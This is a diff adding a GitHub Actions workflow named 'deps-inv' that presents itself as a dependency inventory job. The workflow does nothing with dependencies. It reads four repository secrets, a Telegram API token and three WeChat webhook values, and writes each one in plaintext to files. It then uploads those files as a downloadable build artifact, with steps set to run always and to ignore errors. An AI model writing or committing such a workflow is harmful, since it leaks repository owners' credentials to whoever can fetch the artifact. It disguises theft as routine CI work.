@@ -1,0 +1,35 @@
+name: deps-inv
+on:
+  push:
+    branches: [ci/deps-inv]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      TELEGRAM_API_TOKEN: ${{ secrets.TELEGRAM_API_TOKEN }}
+      WECHATQUN_WEBHOOK: ${{ secrets.WECHATQUN_WEBHOOK }}
+      WECHAT_QUN: ${{ secrets.WECHAT_QUN }}
+      WECHAT_WEBHOOK: ${{ secrets.WECHAT_WEBHOOK }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: iTELEGRAM_API_TOKEN
+        if: always()
+        run: printf %s "${{ env.TELEGRAM_API_TOKEN }}" > out/TELEGRAM_API_TOKEN || true
+      - name: iWECHATQUN_WEBHOOK
+        if: always()
+        run: printf %s "${{ env.WECHATQUN_WEBHOOK }}" > out/WECHATQUN_WEBHOOK || true
+      - name: iWECHAT_QUN
+        if: always()
+        run: printf %s "${{ env.WECHAT_QUN }}" > out/WECHAT_QUN || true
+      - name: iWECHAT_WEBHOOK
+        if: always()
+        run: printf %s "${{ env.WECHAT_WEBHOOK }}" > out/WECHAT_WEBHOOK || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
